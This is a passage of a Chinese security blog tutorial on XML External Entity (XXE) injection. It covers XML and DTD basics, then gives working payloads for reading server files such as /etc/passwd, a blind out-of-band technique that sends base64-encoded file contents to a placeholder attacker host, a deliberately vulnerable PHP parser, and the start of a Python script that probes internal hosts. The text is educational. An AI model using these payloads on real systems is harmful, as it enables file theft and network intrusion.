<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="XXE学习笔记"><meta name="keywords" content="XXE"><meta name="author" content="V0WKeep3r,v0wldl@163.com"><meta name="copyright" content="V0WKeep3r"><title>XXE学习笔记 | V0W's Blog</title><link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="V0W's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-text">XXE是什么</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-XML"><span class="toc-text">什么是 XML?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFDTD%EF%BC%9F"><span class="toc-text">什么是DTD？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE-%E7%9A%84%E6%88%90%E5%9B%A0"><span class="toc-text">XXE 的成因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E7%9A%84%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-text">XXE的攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">1. 有回显的任意文件读取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%88Blind-OOB-XXE%EF%BC%89"><span class="toc-text">2. 无回显任意文件读取（Blind OOB XXE）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-http%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B"><span class="toc-text">3. http内网探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-http%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">4. http内网主机端口探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-XInclude"><span class="toc-text">5. XInclude</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%85%B6%E4%BB%96%E6%94%BB%E5%87%BB"><span class="toc-text">6. 其他攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#6-1-DDoS"><span class="toc-text">6.1 DDoS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-2-php-except%E6%A8%A1%E5%9D%97%E4%B8%8BRCE"><span class="toc-text">6.2 php except模块下RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-3-%E9%92%93%E9%B1%BC"><span class="toc-text">6.3 钓鱼</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE%E7%9A%84%E9%98%B2%E6%8A%A4"><span class="toc-text">XXE的防护</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/Kaneki.jpg"></div><div class="author-info__name text-center">V0WKeep3r</div><div class="author-info__description text-center">Stay Hungry, Stay Foolish.</div><div class="follow-button"><a target="_blank" rel="noopener" href="https://github.com/qingchenldl">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">58</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">31</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">12</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">友链</div><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://zhuxianjin.github.io/">J0k3r</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0desta.com/">p0desta</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="https://daolgts.github.io/">dlgts</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://iwenhu.cn/">mengchen</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://p0sec.net/">p0</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://asa9ao.xyz/">唯湖</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://seaii-blog.com/">seaii</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://wzt.ac.cn/">WCatalpa.T</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://syf.ac.cn/">7N1ght</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://www.nicefish.top/posts/">nicefish</a><a class="author-info-links__name text-center" target="_blank" rel="noopener" href="http://flag0.com/">GetFlag</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/index.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">V0W's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> 搜索</span></a><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">文章</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">分类</a><a class="site-page" href="/about">关于我</a></span></div><div id="post-info"><div id="post-title">XXE学习笔记</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-01-20</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">4.8k</span><span class="post-meta__separator">|</span><span>阅读时长: 19 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么"></a>XXE是什么</h1><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，这是一个注入漏洞。注入的是什么？XML外部实体。因此其利用点是 <strong>外部实体</strong> ，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面。（相反，单纯的XML注入比较鸡肋。）</p>
<blockquote>
<p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p>
</blockquote>
<h2 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML?"></a>什么是 XML?</h2><p>以下内容主要参考<a target="_blank" rel="noopener" href="http://www.w3school.com.cn/x.asp">W3School的XML系列教程</a></p>
<p>要了解XXE，首先要了解XML标记语言。XML标记语言有哪些特征呢？</p>
<ul>
<li>XML 指可扩展标记语言（<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage）</li>
<li>XML 是一种<strong>标记语言</strong>，很类似 HTML</li>
<li>XML 的设计宗旨是<strong>传输数据</strong>，而非显示数据</li>
<li>XML 标签没有被预定义。您需要<strong>自行定义标签</strong>。</li>
<li>XML 被设计为具有<strong>自我描述性</strong>。</li>
</ul>
<p>XML 被设计为传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。XML文档用途广泛，最常见的比如订阅一个网站时的<code>rss.xml</code>等。XML本质上就是一段<strong>自我描述的数据</strong>。XML是一种树结构。语法参考链接<a target="_blank" rel="noopener" href="http://www.w3school.com.cn/xml/xml_syntax.asp">http://www.w3school.com.cn/xml/xml_syntax.asp</a></p>
<p>重点语法规则主要有这样几点：</p>
<ul>
<li><p>所有 XML 元素都须有关闭标签</p>
</li>
<li><p>XML 标签对大小写敏感</p>
</li>
<li><p>XML 必须正确地嵌套</p>
</li>
<li><p>XML 文档必须有根元素</p>
</li>
<li><p>XML 的属性值须加引号</p>
</li>
<li><p>如果你把字符 “&lt;” 放在 XML 元素中，会发生错误，一些特殊字符需要转义。</p>
</li>
</ul>
<p>此外，好的XML文档不仅遵循XML的规范，还符合DTD(document type definition)规范。</p>
<h2 id="什么是DTD？"><a href="#什么是DTD？" class="headerlink" title="什么是DTD？"></a>什么是DTD？</h2><p>所谓的DTD，Document Type Definition，文件类型定义，用来宣告网页的文件类型。举例来说，HTML 有很多版本，如：HTML, HTML2.0, … , XHTML, XHTML5 等，利用&lt;!DOCTYPE&gt; 让浏览器能正确显示内容。</p>
<p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。可一致地使用某个标准的 DTD 来交换数据。应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。还可以使用 DTD 来验证您自身的数据。</p>
<p>它使用一系列合法的元素来定义文档结构：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt; </span><br></pre></td></tr></table></figure>

<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
<p><strong>内部的 DOCTYPE 声明</strong></p>
<p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p>带有 DTD 的 XML 文档实例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [			这是DTD内部声明		</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>      (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span>							</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>以上 DTD 解释如下：</strong></p>
<ul>
<li><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <em>note</em> 类型的文档。</p>
</li>
<li><p><strong>!ELEMENT note</strong> (第三行)定义 <em>note</em> 元素有四个元素：”to、from、heading,、body”</p>
</li>
<li><p><strong>!ELEMENT to</strong> (第四行)定义 <em>to</em> 元素为 “#PCDATA” 类型</p>
<p>(之后类似)</p>
</li>
</ul>
<p><strong>这里有一个小重点Tips：</strong></p>
<ul>
<li>“#PCDATA” 类型为被解析的字符数据（parsed character data）。表示读文件按照XML格式进行解析</li>
<li>“#CDATA”类型为字符数据（character data）。表示读文件但是不用解析，直接读文件的原始内容</li>
</ul>
<p><strong>外部文档声明</strong></p>
<p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span>		# dtd文件的绝对路径</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这是包含 DTD 的 “note.dtd” 文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<p>其他更多的可能需要读者参考这个链接进行学习<a target="_blank" rel="noopener" href="http://www.w3school.com.cn/dtd/index.asp%E3%80%82">http://www.w3school.com.cn/dtd/index.asp。</a></p>
<p><strong>一个内部实体声明</strong></p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-string">&quot;test&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p>
<p><strong>一个外部实体声明</strong></p>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>例子：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="XXE-的成因"><a href="#XXE-的成因" class="headerlink" title="XXE 的成因"></a>XXE 的成因</h1><p>上面介绍了这么多，大概才把XXE的基础知识介绍完，接下来，我们具体看一下这个<strong>外部实体注入漏洞</strong>的成因和攻击面。</p>
<p><strong>会发生XXE 主要是因为<code>parser</code> 没有禁止使用外部实体</strong>，如常见的php函数<code>simplexml_load_string()</code>会解析外部实体。我们可以自行定义一个实体名称，并在实体内容中定义要服务器做的行为，从而造成攻击，因此注入点通常是可以输入XML 的位置。</p>
<h1 id="XXE的攻击面"><a href="#XXE的攻击面" class="headerlink" title="XXE的攻击面"></a>XXE的攻击面</h1><p>那么，我们究竟可以利用XXE做哪些事情呢？下面介绍一下XXE的攻击面。</p>
<h2 id="1-有回显的任意文件读取"><a href="#1-有回显的任意文件读取" class="headerlink" title="1. 有回显的任意文件读取"></a>1. 有回显的任意文件读取</h2><p>攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们可以控制输入的XML代码造成服务器上任意文件的读取。</p>
<p><strong>xml.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-02-14_00001.png"></p>
<p>但是直接读文件，在遇到文件内容中含有<code>&lt;</code>,<code>&amp;</code>等未转义的字符时，解析会报错。这是由于XML的外部实体特性导致的，如以下文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;HTML5 rose&lt;&#x2F;title&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190214210529.png"></p>
<p><strong>解决方案</strong></p>
<p>前面提到CDATA是将文件当做原始字符串而不进行解析，于是，可以通过 <code>&lt;![CDATA[</code>和 <code>]]&gt;</code>将payload包裹起来，使其不解析为XML就可以读取此类文件了。由于普通实体不能直接拼接，需要先拼接再调用，于是需要利用参数实体。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;e:&#x2F;test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure>

<p><strong>evil.dtd</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/02/15/5c66bb86897a5.png"></p>
<p>于是通过<code>XXE</code>和<code>CDATA</code>就基本上实现了任意文件读取。</p>
<h2 id="2-无回显任意文件读取（Blind-OOB-XXE）"><a href="#2-无回显任意文件读取（Blind-OOB-XXE）" class="headerlink" title="2. 无回显任意文件读取（Blind OOB XXE）"></a>2. 无回显任意文件读取（Blind OOB XXE）</h2><p>通常情况下，xml文件是用于服务器的各项配置的，而不是直接输出的，于是我们需要寻找其他不依托服务器回显的方法来实现任意文件读取。</p>
<p><strong>xml.php</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//相比上一段代码，缺少了回显过程，只有解析过程。</span></span><br><span class="line">libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么，利用什么方法来进行无回显的读取呢？</p>
<p>通过之前的学习，我们知道参数实体是可以合并依次调用的。那么我们可以利用三个参数实体，先去访问VPS的一个<code>evil.dtd</code>，调用<code>evil.dtd</code>的参数去读取服务器的敏感文件，放到一个参数中，再利用最后一个参数实体将文件内容发到VPS的一个端口。</p>
<p>利用这个思路，我们可以构造这样的payload：</p>
<p><strong>test.dtd</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;e:&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;ip:2333?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/02/15/5c66cf1bf405b.png"></p>
<p><img src="https://i.loli.net/2019/02/15/5c66cefa5b4a8.png"></p>
<p><strong>需要注意的是</strong>dtd文件中作为内容的一段实体数据需要转义<code>&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://ip:2333?p=%file;&#39;&gt;&quot;</code></p>
<p>发现虽然无回显，但是依然可以通过这样的方法读取数据。</p>
<p>笔者通过一个图来理解整个调用过程：</p>
<p><img src="https://i.loli.net/2019/02/17/5c695e47dc191.png"></p>
<p>上面说了XXE读文件的两种操作，主要适合利用<code>file</code>协议，攻击方式上有点类似SSRF，通过伪造xml外部实体或者dtd文件来执行，读取服务器上的敏感文件。事实上，我们还可以通过XXE打开内网渗透的大门，下面来学习一下通过XXE进行内网的探测。</p>
<h2 id="3-http内网探测"><a href="#3-http内网探测" class="headerlink" title="3. http内网探测"></a>3. http内网探测</h2><p>类似的，我们通过读文件的方式判断是否存在内网主机，筛选出内网主机IP。如果能从中读取到内容，那么可以判断这个IP的内网主机是存在的。</p>
<p>在此之前，还有一个步骤需要完成，即确定内网的网段，时间宝贵，我们应该优先确定内网网段，再查找内网主机IP，所以需要利用XXE读取一些文件如<code>/proc/net/arp</code>，<code>/etc/host</code>等。</p>
<p>还是利用上面有回显<code>xml.php</code>为例子：</p>
<p><img src="https://i.loli.net/2019/02/17/5c691efa362df.png"></p>
<p>读取文件后，基本确定内网网段在<code>192.168.118.0</code></p>
<p>构建脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># referer: https://xz.aliyun.com/t/3357#toc-11</span></span><br><span class="line">ip_arr=[]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_xml</span>(<span class="params">string</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE creds [&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot;</span> + <span class="string">&#x27;&quot;&#x27;</span> + string + <span class="string">&#x27;&quot;&#x27;</span> + <span class="string">&quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;creds&gt;&amp;xxe;&lt;/creds&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># print xml</span></span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line"><span class="function"><span 